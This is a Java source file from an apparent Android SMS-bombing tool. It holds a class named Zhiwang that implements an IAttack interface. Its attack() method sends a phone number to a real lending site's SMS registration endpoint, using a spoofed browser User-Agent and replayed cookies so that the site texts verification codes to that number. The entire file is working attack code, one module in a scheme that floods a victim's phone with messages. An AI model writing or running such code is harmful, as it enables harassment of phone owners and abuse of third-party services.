package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Call;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Zhiwang implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "phone=" + Utils.getNumber(MainApplication.context);

        Request request = new Request.Builder()
                .url("https://zhiwang.yixin.com/m/register/s_m_s")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "zw_user_id=-1; zw_channel=baidusempc; zw_guid=cc7f31d9-a2b6-4dd7-8c54-c9b78c1cd86e; _grep_awk=7af28cf5bf6096c8443f1b9594e5bc21; Hm_lvt_1388c2a2cfa1c8206570b11179b43662=1450258992,1450259116; Hm_lpvt_1388c2a2cfa1c8206570b11179b43662=1450259116; zw_l_tm=1450259117428; _lmt_guid=9eef8b3a-5ffa-e19e-dcdd-bc00e5121daf; _lmt_utm=utm_source=baidusempc&utm_medium=zw-cpc&utm_term=%25E6%258C%2587%25E6%2597%25BA%25E7%2590%2586%25E8%25B4%25A2&utm_content=%25E6%258C%2587%25E6%2597%25BA&utm_campaign=%25E5%2593%2581%25E7%2589%258C%25E8%25AF%258D&bd_wd=%25E6%258C%2587%25E6%2597%25BA%25E7%2590%2586%25E8%25B4%25A2; _lmt_sid=b6cd211d-02f0-043d-917c-3f0927edc3c9; _lmt_e_guid=9eef8b3a-5ffa-e19e-dcdd-bc00e5121daf")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
